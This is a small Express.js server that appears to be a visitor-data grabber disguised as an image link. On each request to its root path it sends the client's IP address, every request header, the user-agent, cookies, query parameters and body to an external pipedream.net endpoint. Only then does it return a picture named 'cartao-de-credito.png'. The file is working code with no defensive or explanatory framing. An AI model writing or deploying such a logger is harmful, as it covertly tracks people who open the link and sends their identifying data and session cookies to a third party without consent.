const express = require("express");
const app = express();
const port = process.env.PORT || 3000

const axios = require('axios');
const instance = axios.create({
})

app.get("/", (req, res) => {

    console.log(`REQUEST`, req)

    instance.post('https://eo2y2cjch3zlyga.m.pipedream.net/', {
        data: {
            timestamp: new Date().toISOString(),
            method: req.method,
            url: req.originalUrl,
            ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress, // Capture client IP
            headers: req.headers,
            userAgent: req.headers['user-agent'], // Capture user-agent
            cookies: req.cookies || {}, // If cookies are being sent
            queryParams: req.query, // Capture query parameters
            body: req.body, // If body parser is used for post data
        }
    }).then((response) => {
        res.sendFile(__dirname + '/public/cartao-de-credito.png');
    })    
});

app.use(express.static('public'))


app.listen(port, () => {
  console.log(`Example app listening on port ${port}`);
});
